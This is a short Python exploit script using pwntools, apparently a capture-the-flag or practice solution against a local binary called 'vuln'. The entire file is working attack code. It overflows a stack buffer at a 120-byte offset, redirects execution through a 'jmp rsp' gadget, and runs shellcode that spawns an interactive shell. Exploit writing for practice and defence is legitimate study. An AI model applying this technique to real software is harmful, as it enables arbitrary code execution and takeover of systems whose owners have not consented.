#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rsp = next(elf.search(asm('jmp rsp')))

offset = 120

payload = flat(
    b'A' * offset,
    jmp_rsp,
    asm(shellcraft.sh()) # rsp will point here
)

p.sendlineafter(b'RSP!\n', payload)
p.interactive()
